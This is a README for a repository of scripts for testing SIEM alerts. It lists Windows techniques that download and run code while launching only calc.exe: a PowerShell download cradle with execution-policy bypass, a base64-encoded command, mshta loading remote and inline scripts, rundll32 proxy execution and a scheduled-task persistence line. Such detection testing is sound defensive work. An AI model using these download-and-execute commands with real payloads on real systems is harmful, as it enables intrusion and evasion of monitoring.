# runcalc
Just some basic scripts for testing SIEM alerts


# Invoke-Expression
This powershell script just launch calc.exe using methods to download and execute various malicious payloads.  Below are some of the ways to call this.

### Standard Execution
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/invokecalc.ps1');invoke-calc"

### Execute with cmd.exe
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/nothingtoseehere.txt') | Out-File eula.txt; cmd /c $(type .\eula.txt)

### Base 64 Encoded Execution
powershell -noprofile -noninteractive -executionpolicy bypass -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGwAbwBzAHQAdAByAG8AbABsAC8AYgBsAHUAZQB0AGUAcwB0AHMALwBtAGEAaQBuAC8AaQBuAHYAbwBrAGUAYwBhAGwAYwAuAHAAcwAxACcAKQA7AGkAbgB2AG8AawBlAC0AYwBhAGwAYwAiAA==

## MSHTA
The command will use MSHTA to download a payload that executes calc.exe

### Remote Payload
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct").Exec();close();

### Local Payload
mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""calc.exe"""))</script>'"

### Local Payload w/ Powershell
mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20calc.exe"""))</script>'"

### Download and Display the Payload
mshta https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct

## RunDLL32.exe
rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\calc.exe

## Task Scheduler
schtasks /Create /F /SC MINUTE /MO 3 /ST 11:50 /TN CalcLocalTask /TR "calc.exe"
